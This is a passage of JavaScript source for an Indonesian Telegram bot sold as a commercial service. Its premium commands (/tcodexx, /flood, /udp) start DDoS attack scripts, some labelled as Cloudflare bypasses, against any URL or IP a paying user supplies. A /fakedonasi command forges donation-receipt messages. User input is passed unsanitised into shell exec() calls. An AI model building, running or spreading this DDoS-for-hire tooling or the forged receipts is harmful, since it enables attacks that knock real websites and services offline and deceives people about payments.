╔─═⊱ 「 𝐌𝐄𝐍𝐔 𝐓𝐎𝐎𝐋𝐒 」 ─═⬣
│┏⊱
║⿻ /donasi
║⿻ /stop
║⿻ /ping - <host>
║⿻ /http - <host>
║⿻ /dns - <host>
║⿻ /cekprem <id>
║⿻ /myprem
║⿻ /fakedonasi - <Nama> <gmail> <uang> <pesan> <lanjut>
║┗⊱
┗━━━━━━━━━━━━━━━━⬣`,
    {
      reply_markup: {
        inline_keyboard: [
          [
            { text: '👑 OWNER 👑', url: 'https://t.me/Oficiallz' }
          ],
          [
            { text: '🛒 BELI PREMIUM 🛒', url: 'https://t.me/Oficiallz' }
        ]
         ]
      },
      parse_mode: "Markdown"
    }
  );
});

bot.onText(/\/getid/, (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  
  bot.sendMessage(chatId, `ID Telegram Anda: \`${userId}\``, { parse_mode: "Markdown" });
});

bot.onText(/\/panelhow/, (msg) => {
    const chatId = msg.chat.id;
    const sender = msg.from.username;
    const owner = '5987304194'; // Ganti dengan ID pemilik bot 
    const text12 = `*Hi @${sender} 👋*
    
𝗖𝗔𝗥𝗔 𝗕𝗜𝗞𝗜𝗡 𝗣𝗔𝗡𝗘𝗟 𝗕𝗬 𝐑𝐞𝐥𝐢𝐱𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥 🔥

𝗖𝗔𝗥𝗔 𝗔𝗗𝗗 𝗨𝗦𝗘𝗥 𝗣𝗔𝗡𝗘𝗟 :
/ram username,idtele

𝗰𝗼𝗻𝘁𝗼𝗵 : /𝟭𝗴𝗯 Udin,𝟭𝟯𝟰𝟰𝟱𝟱𝘅𝘅𝘅

𝗕𝘂𝘆 𝗣𝗿𝗲𝗺? 𝗕𝘂𝘆 𝗩𝗽𝘀? 𝗕𝘂𝘆 𝗔𝗱𝗺𝗶𝗻𝗣&𝗣𝘁 𝗣𝗮𝗻𝗲𝗹? 𝗕𝘂𝘆 𝗦𝗰? 𝗣𝘃 (@Oficiallz)`;
    const keyboard = {
        reply_markup: {
            inline_keyboard: [
                [{ text: '🖥️ Buy Panel', url: 'https://t.me/Oficiallz/buy_panel' }, { text: '👤 Buy Admin', url: 'https://t.me/Oficiallz/buyadminp & ptpanel' }],
                [{ text: '🇲🇨 Buy Vps', url: 'https://t.me/Oficiallz/buyvps' }]
            ]
        }
    };
    bot.sendPhoto(chatId, settings.pp, { caption: text12, parse_mode: 'Markdown', reply_markup: keyboard });
});

// Event handling untuk perintah /myprem
bot.onText(/\/myprem/, (msg) => {
    try {
        const userData = getUserData(msg.from.id
        );
        if (userData.isDDOS || userData.isReseller) {
            bot.sendMessage(msg.chat.id, '🎉🥳 Selamat datang, ' + (msg.from.username || 'Unknown') + '! 🥳🎉\nKami dengan senang hati ingin memberikan sambutan khusus untuk Anda sebagai anggota premium kami. 🌟✨\n\nSebagai anggota premium, Anda akan menikmati berbagai keuntungan eksklusif yang tidak akan didapatkan oleh anggota non premium. 🎁💎 Dapatkan akses penuh ke konten premium kami, diskon khusus, layanan pelanggan prioritas, dan masih banyak lagi! 💯\n\nKami sangat berterima kasih atas kepercayaan dan dukungan Anda sebagai anggota premium. Kami berharap Anda dapat merasakan pengalaman yang luar biasa bersama kami. 🙏🤩\n\nJangan lupa untuk terus mengikuti kami di sini dan di @Oficiallz untuk mendapatkan informasi terbaru, penawaran eksklusif, dan kesempatan menarik lainnya! 📲✉️', {
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: 'Beli Premium',
                            url: 'https://t.me/Oficiallz'
                        }]
                    ]
                }
            });
        } else {
            bot.sendMessage(msg.chat.id, 'Hallo ' + (msg.from.username || 'Unknown') + '\nJika Anda belum menjadi anggota premium, jangan khawatir! Anda juga dapat menikmati pengalaman yang luar biasa dengan mengupgrade ke keanggotaan premium kami. Silakan hubungi @Oficiallz untuk informasi lebih lanjut. 💼💰\nTerima kasih atas perhatian dan selamat bergabung dengan komunitas premium kami! 🎊🙌\n\n#PremiumMember #ExclusiveExperience #JoinTheCommunity', {
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: 'Beli Premium',
                            url: 'https://t.me/Oficiallz'
                        }]
                    ]
                }
            });
        }
    } catch (err) {
        console.error('Error reading premiumUsers data', err.message);
        bot.sendMessage(msg.chat.id, 'Terjadi kesalahan saat memeriksa status premium.');
    }
});


// Inisialisasi bot
const MAX_MESSAGES_BEFORE_CLEAR_PROMPT = 15;
let messageCount = 0;

bot.onText(/\/clear/, (msg) => {
  const chatId = msg.chat.id;

  if (messageCount < MAX_MESSAGES_BEFORE_CLEAR_PROMPT) {
    // Menghapus riwayat obrolan bot dengan pengguna
    bot.deleteMessage(chatId, msg.message_id)
      .then(() => {
        messageCount++;
        bot.sendMessage(chatId, 'Riwayat obrolan Anda telah dihapus.');
      })
      .catch((error) => {
        console.error('Error deleting message:', error);
        bot.sendMessage(chatId, 'Maaf, terjadi kesalahan dalam menghapus riwayat obrolan.');
      });
  } else {
    bot.sendMessage(chatId, 'Anda telah menggunakan bot ini sebanyak 15 kali. Mohon bersihkan riwayat chat Anda sendiri untuk melanjutkan penggunaan bot.');
  }
});

bot.onText(/\/cekprem (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const idnya = match[1];
 const userData = getUserData(idnya);
  if (userData.isReseller || userData.isDDOS) {
    bot.sendMessage(chatId, 'ID ' + idnya + ' adalah pengguna premium. 🌟🌟🌟');
  } else {
    bot.sendMessage(chatId, 'ID ' + idnya + ' adalah pengguna non-premium❗.');
  }
});


bot.onText(/\/donasi/, (msg) => {
const chatId = msg.chat.id;
    const saweriaLink = 'https://sociabuzz.com/adisdzaky';
    const buttonOptions = {
        reply_markup: {
            inline_keyboard: [
                [
                    { text: 'Donasi ke Saya', url: 'https://sociabuzz.com/adisdzaky' }
                ]
            ]
        }
    };
    const donasiMessage = `Terima kasih telah mendukung kami melalui donasi! Jika Anda ingin memberikan donasi, silakan klik button dibawah ini 🤗`;

     bot.sendPhoto(chatId, 'https://i.postimg.cc/k4zGCvDz/QRIS-1.png', {
            caption: donasiMessage,
            buttonOptions});
});



bot.onText(/\/fakedonasi (.+) (.+) (.+) (.+) (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const nama = match[1];
  const gmail = match[2];
  const uang = match[3];
  const pesan = match[4];
  const lanjut = match[5];

  const waktu = new Date().toLocaleString("en-US", { timeZone: "Asia/Jakarta" });
  const id = generateUUID();

  const donasiMessage = `Donasi Baru Diterima! 🎉\n\nWaktu: ${waktu}\nID: ${id}\nTipe: donation\nTotal: Rp ${uang}\nPotongan: -3750\nNama Pengirim: ${nama}\nEmail Pengirim: ${gmail}\nPesan: ${pesan} ${lanjut}`;

  const keyboard = [
    [{
      text: "Donasi Juga",
      url: "https://sociabuzz.com/adisdzaky"
    }]
  ];

  const messageOptions = {
    reply_markup: JSON.stringify({
      inline_keyboard: keyboard
    })
  };

  bot.sendMessage(chatId, donasiMessage, messageOptions)
    .then(() => {
      bot.sendMessage(chatId, "Pesan donasi berhasil dikirim");
    })
    .catch((error) => {
      bot.sendMessage(chatId, "Gagal mengirim pesan donasi");
    });
});

function generateUUID() {
  return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
    var r = Math.random() * 16 | 0,
      v = c === 'x' ? r : (r & 0x3 | 0x8);
    return v.toString(16);
  });
}

//menu chekhost
function createButton(text, url) {
  return {
    text: text,
    url: url
  };
}


bot.sendMessage(settings.adminId, startupMessage, {
  parse_mode: 'MarkdownV2',
  reply_markup: {
    inline_keyboard: [
      [{text: '🚀 MENU STORE', callback_data: 'start'}],
      [
        {text: '⚙️ MENU V2', callback_data: 'menu2'}
      ]
    ]
  }
});

bot.on('callback_query', async (callbackQuery) => {
    const chatId = callbackQuery.message.chat.id; 
    const userId = callbackQuery.from.id;

    if (callbackQuery.data === 'start') {
        await bot.answerCallbackQuery(callbackQuery.id);

        await bot.sendMessage(chatId, menuText, {
            reply_markup: {
                inline_keyboard: [
                    [{ text: '📞 Bantuan', callback_data: 'support' }],
                     [{ text: '📃 Syarat & Ketentuan', callback_data: 'tnc' }]
                ]
            },
            parse_mode: "Markdown"
        });

    } else if (callbackQuery.data === 'support') {
    await bot.sendMessage(chatId, supportText, {
            reply_markup: {
                inline_keyboard: [
                    [{ text: '🏠 Home', callback_data: 'start' }]
                ]
            }
        });

    } else if (callbackQuery.data === 'tnc') {
        await bot.sendMessage(chatId, tncText, {
            reply_markup: {
                inline_keyboard: [
                    [{ text: '🏠 Home', callback_data: 'start' }]
                ]
            }
        });

    } else if (callbackQuery.data === 'menu2') {
        await bot.sendMessage(chatId, menu2Text, {
            reply_markup: {
                inline_keyboard: [
                    [{ text: '👑 OWNER 👑', url: 'https://t.me/Oficiallz' }],
                    [
                        { text: '🛒 BELI PREMIUM 🛒', url: 'https://t.me/Oficiallz' },
                        { text: '📮 BELI SCRIPT 📮', url: 'https://t.me/Oficiallz' }
                    ]
                ]
            },
            parse_mode: "Markdown"
        });
    }
});

//menu chekhost
bot.onText(/\/ping (.+)/, (msg, match) => {
  const web = match[1];
  const url = `https://check-host.net/check-ping?host=${web}&`;
  const button = createButton('Click disini', url);
  bot.sendMessage(msg.chat.id, 'Klik link di bawah untuk melihat hasil:', {
    reply_markup: {
      inline_keyboard: [
        [button]
      ]
    }
  });
});

bot.onText(/\/http (.+)/, (msg, match) => {
  const web = match[1];
  const url = `https://check-host.net/check-http?host=${web}&csrf_token=`;
  const button = createButton('Click disini', url);
  bot.sendMessage(msg.chat.id, 'Klik link di bawah untuk melihat hasil:', {
    reply_markup: {
      inline_keyboard: [
        [button]
      ]
    }
  });
});

bot.onText(/\/info (.+)/, (msg, match) => {
  const web = match[1];
  const url = `https://check-host.net/ip-info?host=${web}`;
  const button = createButton('Click disini', url);
  bot.sendMessage(msg.chat.id, 'Klik link di bawah untuk melihat hasil:', {
    reply_markup: {
      inline_keyboard: [
        [button]
      ]
    }
  });
});

bot.onText(/\/dns (.+)/, (msg, match) => {
  const web = match[1];
  const url = `https://check-host.net/check-dns?host=${web}&csrf_token=`;
  const button = createButton('Click disini', url);
  bot.sendMessage(msg.chat.id, 'Klik link di bawah untuk melihat hasil:', {
    reply_markup: {
      inline_keyboard: [
        [button]
      ]
    }
  });
});


bot.onText(/\/uagen (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    
    if (isPremiumUser(userId)) {
      const jumlah = match[1];
      const uafile = './lib/method/ua.txt';
      
       bot.sendMessage(chatId, `Success`);
       
      
      exec(`node ./lib/method/uagen.js ${jumlah} ${uafile}`, (error, stdout, stderr) => {
        if (error) {
          bot.sendMessage(chatId, `Error: ${error.message}`);
          return;
        }
        if (stderr) {
          bot.sendMessage(chatId, `Error: ${stderr}`);
          return;
        }
        bot.sendMessage(chatId, `Success`);
      });
      
      
    } else {
      bot.sendMessage(chatId, 'Maaf, hanya pengguna premium yang dapat menggunakan perintah ini.');
    }
  });


//menu crash
try {

  // menu stop
  bot.onText(/\/stop/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const userData = getUserData(userId);
try {
  if (userData.isDDOS) {
  if (process1) {
    process1.kill();
    process1 = null;
  }
  if (process2) {
    process2.kill();
    process2 = null;
  }
  if (process3) {
    process3.kill();
    process3 = null;
  }
    
  } else {
    bot.sendMessage(chatId, 'Maaf, hanya pengguna premium yang dapat menggunakan perintah ini.');
  }
} catch (err) {
console.log(err);
bot.sendMessage(chatId, `Error Menghentikan DDoS: ` + err);
}
});
 
 
  bot.onText(/\/tcodexx (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const usernameAkun = msg.from.username;
    const userData = getUserData(userId);
    const text = match[1];
        
    if (userData.isDDOS) {
      const args = text.split(' ');
    if (args.length < 2) return bot.sendMessage(chatId, 'Format yang benar adalah: /tcodex <url> <duration>');

  const target = args[0];
  const time = parseInt(args[1], 10);
  const methods = 'tcodexx';
  
try {
const attackMethods = {
    tcodexx: `node ./lib/method/tcodexx.js ${target} ${time} 443 443 proxy.txt`,
    tcodexx: `node ./lib/method/HTTP-X.js ${target} ${time} 443 443 proxy.txt`,
    tcodexx: `node ./lib/method/TcodeX-XcV.js ${target} ${time} 443 443 proxy.txt`,
    tcodexx: `node ./lib/method/Ninja.js ${target} ${time} 443 443 proxy.txt`,
    tcodexx: `node ./lib/method/turbo.js ${target} ${time} 443 443 proxy.txt`,
    tcodexx: `node ./lib/method/destroy.js ${target} ${time} 50 5 proxy.txt`,
    tcodexx: `node ./lib/method/CFbypass.js ${target} ${time}`
}
    if (attackMethods[methods]) {
      const attackProcess = exec(attackMethods[methods], (error, stdout, stderr) => {
    if (error) {
      console.error(`Error: ${error.message}`);
    }
    if (stderr) {
      console.error(`Stderr: ${stderr}`);
    }
  });
      
      const result = await outputDdos(target, time, methods, usernameAkun);
       bot.sendMessage(chatId, `╔─═⊱「 ᎪᎢᎢᎪᏟᏦ ⲊᎬƝᎠ 」─═⬣
║• Target: ${target}
║• Methods: Tcodex
║• Duration: ${time}
║=> ISP: ${result.isp}
║=> IP: ${result.query}
║=> AS: ${result.as}
┗━━━━━━━━━━━━━━⬣`);

      // Menghentikan serangan setelah durasi yang ditentukan
      setTimeout(() => {
        attackProcess.kill();
        bot.sendMessage(chatId, `💥Serangan ke ${target} telah selesai💥`);
      }, time * 1000);
    } else {
      return bot.sendMessage(chatId, 'Methods Yang Anda Tulis Tidak Ada');
    }
   } catch (error) {
    console.log('error mt: ' + error);
   }

    } else {
      bot.sendMessage(chatId, 'Maaf, hanya pengguna premium yang dapat menggunakan perintah ini.');
    }
  });

// ======= [ end super premium method ] ========

bot.onText(/\/flood (.+) (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const usernameAkun = msg.from.username;
    const userData = getUserData(userId);
    
    if (userData.isDDOS) {
      const web = match[1];
      const time = match[2];
      const result = await outputDdos(web, time, 'Glory', usernameAkun);
       bot.sendMessage(chatId, `╔─═⊱「 ᎪᎢᎢᎪᏟᏦ ⲊᎬƝᎠ 」─═⬣
║• Target: ${web}
║• Methods: Glory
║• Duration: ${time}
║=> ISP: ${result.isp}
║=> IP: ${result.query}
║=> AS: ${result.as}
┗━━━━━━━━━━━━━━⬣`);
       
 
      process1 = exec(`node ./lib/method/Glory.js ${web} ${time} 10 5 proxy.txt`, (error, stdout, stderr) => {
        if (error) {
          bot.sendMessage(chatId, `Error: ${error.message}`);
          return;
        }
        if (stderr) {
          bot.sendMessage(chatId, `Error: ${stderr}`);
          return;
        }
        bot.sendMessage(chatId, `Success\n\nTarget: ${web},\nTime: ${time}`);
      });
     
    process2 = exec(`node ./lib/method/tls-arz.js ${web} ${time} 5 9 proxy.txt`, (error, stdout, stderr) => {
        if (error) {
          bot.sendMessage(chatId, `Error: ${error.message}`);
          return;
        }
        if (stderr) {
          bot.sendMessage(chatId, `Error: ${stderr}`);
          return;
        }
        bot.sendMessage(chatId, `Success\n\nTarget: ${web},\nTime: ${time}`);
      });
      

    } else {
      bot.sendMessage(chatId, 'Maaf, hanya pengguna premium yang dapat menggunakan perintah ini.');
    }
  });


  

// L4
bot.onText(/\/udp (.+) (.+) (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const usernameAkun = msg.from.username;
    const userData = getUserData(userId);
    
    if (userData.isDDOS) {
      const ip = match[1];
      const port = match[2];
      const time = match[3];
      const target = ip + ':' + port;
      const result = await outputDdos(ip, time, 'UDP', usernameAkun);
       bot.sendMessage(chatId, `╔─═⊱「 ᎪᎢᎢᎪᏟᏦ ⲊᎬƝᎠ 」─═⬣
║• Target: ${target}
║• Methods: UDP
║• Duration: ${time}
║=> ISP: ${result.isp}
║=> IP: ${result.query}
║=> AS: ${result.as}
┗━━━━━━━━━━━━━━⬣`);
       
      
     process1 = exec(`node ./lib/method/udp.js ${ip} ${port} ${time}`, (error, stdout, stderr) => {
        if (error) {
          bot.sendMessage(chatId, `Error: ${error.message}`);
          return;
        }
        if (stderr) {
          bot.sendMessage(chatId, `Error: ${stderr}`);
          return;
        }
        bot.sendMessage(chatId, `Success\n\nTarget: ${web},\nTime: ${time}`);
      });

    } else {
      bot.sendMessage(chatId, 'Maaf, hanya pengguna premium yang dapat menggunakan perintah ini.');
    }
  });


} catch (error) {
  console.log(error);

}

//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//


bot.onText(/\/addprem (.+)/, (msg, match) => {
    const userId = msg.from.id;
    const targetUserId = match[1];
    const data = readData();

    // Validasi admin
    if (userId != adminId) {
        return bot.sendMessage(msg.chat.id, '❌ Anda bukan admin!');
    }

    // Jika user belum ada, buat data baru
    if (!data[targetUserId]) {
        data[targetUserId] = {
            data: {
                isAdminReseller: false,
                isReseller: false,
                isAdminDDOS: false,
                isDDOS: false
            }
        };
        console.log(`Membuat data baru untuk user ${targetUserId}`);
    }

    // Update status premium
    data[targetUserId].data.isDDOS = true;
    saveData(data);
    
    bot.sendMessage(msg.chat.id, `✅ Premium berhasil ditambahkan untuk user ${targetUserId}`);
});

bot.onText(/\/delprem (.+)/, (msg, match) => {
    const userId = msg.from.id;
    const targetUserId = match[1];
    const data = readData();

    // Ganti dengan ID admin yang valid
    if (userId != adminId) { // Ganti dengan ID admin sebenarnya
        return bot.sendMessage(adminId, 'Anda bukan admin!');
    }

    if (data[targetUserId]) {
        data[targetUserId].data.isDDOS = false;
        saveData(data);
        bot.sendMessage(msg.chat.id, `Premium berhasil ditambahkan untuk user ${targetUserId}`);
    } else {
        bot.sendMessage(msg.chat.id, 'User tidak ditemukan!');
    }
});

bot.onText(/\/addreseller (.+)/, (msg, match) => {
    const userId = msg.from.id;
    const targetUserId = match[1];
    const data = readData();
    const userData = getUserData(userId);
    // Validasi admin
    if (!userData.isAdminReseller && userId != adminId) {
        return bot.sendMessage(msg.chat.id, '❌ Anda bukan admin!');
    }

    // Jika user belum ada, buat data baru
    if (!data[targetUserId]) {
        data[targetUserId] = {
            data: {
                isAdminReseller: false,
                isReseller: false,
                isAdminDDOS: false,
                isDDOS: false
            }
        };
        console.log(`Membuat data baru untuk user ${targetUserId}`);
    }

    // Update status premium
    data[targetUserId].data.isReseller = true;

    saveData(data);
    
    bot.sendMessage(msg.chat.id, `✅ Premium berhasil ditambahkan untuk user ${targetUserId}`);
});

bot.onText(/\/delreseller (.+)/, (msg, match) => {
    const userId = msg.from.id;
    const targetUserId = match[1];
    const data = readData();

    // Ganti dengan ID admin yang valid
    if (userId != adminId) { // Ganti dengan ID admin sebenarnya
        return bot.sendMessage(adminId, 'Anda bukan admin!');
    }

    if (data[targetUserId]) {
        data[targetUserId].data.isPremium = false;
        saveData(data);
        bot.sendMessage(msg.chat.id, `Premium berhasil ditambahkan untuk user ${targetUserId}`);
    } else {
        bot.sendMessage(msg.chat.id, 'User tidak ditemukan!');
    }
});


// 1gb
bot.onText(/\/1gb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const text = match[1];

  const userData = getUserData(userId);
  if (!userData.isReseller && !userData.isAdminReseller && userId != adminId) {
    bot.sendMessage(chatId, 'Perintah Hanya Untuk Users Premium Atau Chat Tidak Terdaftar!!, Hubungi Admi...', {
      reply_markup: {
        inline_keyboard: [
          [
            { text: 'HUBUNGI ADMIN', url: 'https://t.me/Oficiallz' }
          ]
        ]
      }
    });
    return;
  }
  const t = text.split(',');
  if (t.length < 2) {
    bot.sendMessage(chatId, 'Invalid format. Usage: /1gb namapanel,idtele', {
      reply_markup: {
        inline_keyboard: [
          [
            { text: 'HUBUNGI ADMIN', url: 'https://t.me/Oficiallz' }
          ]
        ]
      }
    });
    return;
  }

  const username = t[0];
  const u = t[1];
  const name = username + '1gb';
  const egg = settings.eggs;
  const loc = settings.loc;
  const nests = settings.nests;
  const memo = '1024';
  const cpu = '40';
  const disk = '1024';
  const email = `${username}@Relix.com`;
  const akunlo = settings.pp;
  const password = generateRandomPassword();
  let user;
  let server;
  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: 'POST',
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${plta}`
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: 'en',
        password: password
      })
    });
    const data = await response.json();
    if (data.errors) {
      if (data.errors[0].meta.rule === 'unique' && data.errors[0].meta.source_field === 'email') {
        bot.sendMessage(chatId, 'Email already exists. Please use a different email.');
      } else {
        bot.sendMessage(chatId, `Error: ${JSON.stringify(data.errors[0], null, 2)}`);
      }
      return;
    }
    user = data.attributes;
    const responses = await fetch(`${domain}/api/application/nests/${nests}/eggs/${egg}`, {
method: 'GET',
headers: {
'Accept': 'application/json',
'Content-Type': 'application/json',
'Authorization': `Bearer ${plta}`
}
})
const data4 = await responses.json();
const startup_cmd = data4.attributes.startup
    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: 'POST',
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${plta}`
      },
      body: JSON.stringify({
        name: name,
        description: '',
        user: user.id,
        egg: parseInt(egg),
        docker_image: 'ghcr.io/parkervcp/yolks:nodejs_18',
        startup: startup_cmd,
        environment: {
          INST: 'npm',
          USER_UPLOAD: '0',
          AUTO_UPDATE: '0',
          CMD_RUN: 'npm start'
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 0
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: []
        }
      })
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
    bot.sendMessage(chatId, `BERIKUT DATA PANEL ANDA
ID: ${server.id}
NAMA: ${username}
EMAIL: ${email}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%`);

    if (akunlo) {
    
      bot.sendPhoto(u, akunlo, {
        caption: `Hai @${u}

HERE'S YOUR PANEL DATA ⤵️
🚩 Username : ${user.username}
🚩 Password : ${password}
🚩 Login : ${domain}
==============================
Jangan Lupa Bilang Done Jika Sudah Di Cek
==============================
➡️ Rules : 

• Jangan Curi Sc
• Jangan Buka Panel Orang
• Jangan Ddos Server
• Kalo jualan sensor domainnya
• Jangan Bagi² Panel Free
• Jangan Jualan AdminP Kecuali Pt Gw !!
• Dilirang Keras Pasang Sc/Bot DDOS
==============================
THANKS FOR BUYING AT RelixOfficial😁✌️ ` 
        });
      bot.sendMessage(chatId, 'Data panel berhasil dikirim ke ID Telegram yang dimaksud.');
    }
  } else {
    bot.sendMessage(chatId, 'Gagal membuat data panel. Silakan coba lagi.');
  }
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//

//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
// 2gb
bot.onText(/\/2gb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const text = match[1];
  
const userData = getUserData(userId);
   if (!userData.isReseller && !userData.isAdminReseller) {
    bot.sendMessage(chatId, 'Perintah Hanya Untuk Users Premium Atau Chat Tidak Terdaftar!!, Hubungi Admi...', {
      reply_markup: {
        inline_keyboard: [
          [
            { text: 'HUBUNGI ADMIN', url: 'https://t.me/Oficiallz' }
          ]
        ]
      }
    });
    return;
  }
  const t = text.split(',');
  if (t.length < 2) {
    bot.sendMessage(chatId, 'Invalid format. Usage: /2gb namapanel,idtele');
    return;
  }
  const username = t[0];
  const u = t[1];
  const name = username + '2gb';
  const egg = settings.eggs;
  const loc = settings.loc;
  const nests = settings.nests;
  const memo = '2248';
  const cpu = '65';
  const disk = '2248';
  const email = `${username}_${u}@Relix.com`;
  const akunlo = settings.pp;
  const password = generateRandomPassword();
  let user;
  let server;
  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: 'POST',
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${plta}`
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: 'en',
        password: password
      })
    });
    const data = await response.json();
    if (data.errors) {
      if (data.errors[0].meta.rule === 'unique' && data.errors[0].meta.source_field === 'email') {
        bot.sendMessage(chatId, 'Email already exists. Please use a different email.');
      } else {
        bot.sendMessage(chatId, `Error: ${JSON.stringify(data.errors[0], null, 2)}`);
      }
      return;
    }
    user = data.attributes;
    const responses = await fetch(`${domain}/api/application/nests/${nests}/eggs/${egg}`, {
method: 'GET',
headers: {
'Accept': 'application/json',
'Content-Type': 'application/json',
'Authorization': `Bearer ${plta}`
}
})
const data4 = await responses.json();
const startup_cmd = data4.attributes.startup
    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: 'POST',
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${plta}`
      },
      body: JSON.stringify({
        name: name,
        description: '',
        user: user.id,
        egg: parseInt(egg),
        docker_image: 'ghcr.io/parkervcp/yolks:nodejs_18',
        startup: startup_cmd,
        environment: {
          INST: 'npm',
          USER_UPLOAD: '0',
          AUTO_UPDATE: '0',
          CMD_RUN: 'npm start'
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 0
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: []
        }
      })
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
    bot.sendMessage(chatId, `BERIKUT DATA PANEL ANDA
ID: ${server.id}
NAMA: ${username}
EMAIL: ${email}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%`);
    if (akunlo) {
      bot.sendPhoto(u, akunlo, {
        caption: `Hai @${u}

HERE'S YOUR PANEL DATA ⤵️
🚩 Username : ${user.username}
🚩 Password : ${password}
🚩 Login : ${domain}  
==============================
Jangan Lupa Bilang Done Jika Sudah Di Cek
==============================
➡️ Rules : 

• Jangan Curi Sc
• Jangan Buka Panel Orang
• Jangan Ddos Server
• Kalo jualan sensor domainnya
• Jangan Bagi² Panel Free
• Jangan Jualan AdminP Kecuali Pt Gw !!
• Dilirang Keras Pasang Sc/Bot DDOS
==============================
THANKS FOR BUYING AT RelixOfficial😁✌ ` 
        });
      bot.sendMessage(chatId, 'Data panel berhasil dikirim ke ID Telegram yang dimaksud.');
    }
  } else {
    bot.sendMessage(chatId, 'Gagal membuat data panel. Silakan coba lagi.');
  }
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
// 3gb
bot.onText(/\/3gb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const text = match[1];
  
  const userData = getUserData(userId);
   if (!userData.isReseller && !userData.isAdminReseller) {
    bot.sendMessage(chatId, 'Perintah Hanya Untuk Users Premium Atau Chat Tidak Terdaftar!!, Hubungi Admi...', {
      reply_markup: {
        inline_keyboard: [
          [
            { text: 'HUBUNGI ADMIN', url: 'https://t.me/Oficiallz' }
          ]
        ]
      }
    });
    return;
  }
  const t = text.split(',');
  if (t.length < 2) {
    bot.sendMessage(chatId, 'Invalid format. Usage: /3gb namapanel,idtele');
    return;
  }
  const username = t[0];
  const u = t[1];
  const name = username + '3gb';
  const egg = settings.eggs;
  const loc = settings.loc;
  const nests = settings.nests;
  const memo = '3172';
  const cpu = '100';
  const disk = '3172';
  const email = `${username}@Relix.com`;
  const akunlo = settings.pp;
  const password = generateRandomPassword();
  let user;
  let server;
  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: 'POST',
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${plta}`
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: 'en',
        password: password
      })
    });
    const data = await response.json();
    if (data.errors) {
      if (data.errors[0].meta.rule === 'unique' && data.errors[0].meta.source_field === 'email') {
        bot.sendMessage(chatId, 'Email already exists. Please use a different email.');
      } else {
        bot.sendMessage(chatId, `Error: ${JSON.stringify(data.errors[0], null, 2)}`);
      }
      return;
    }
    user = data.attributes;
    const responses = await fetch(`${domain}/api/application/nests/${nests}/eggs/${egg}`, {
method: 'GET',
headers: {
'Accept': 'application/json',
'Content-Type': 'application/json',
'Authorization': `Bearer ${plta}`
}
})
const data4 = await responses.json();
const startup_cmd = data4.attributes.startup
    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: 'POST',
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${plta}`
      },
      body: JSON.stringify({
        name: name,
        description: '',
        user: user.id,
        egg: parseInt(egg),
        docker_image: 'ghcr.io/parkervcp/yolks:nodejs_18',
        startup: startup_cmd,
        environment: {
          INST: 'npm',
          USER_UPLOAD: '0',
          AUTO_UPDATE: '0',
          CMD_RUN: 'npm start'
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 0
        },
        deploy: {
          locations: [parseInt(loc)],
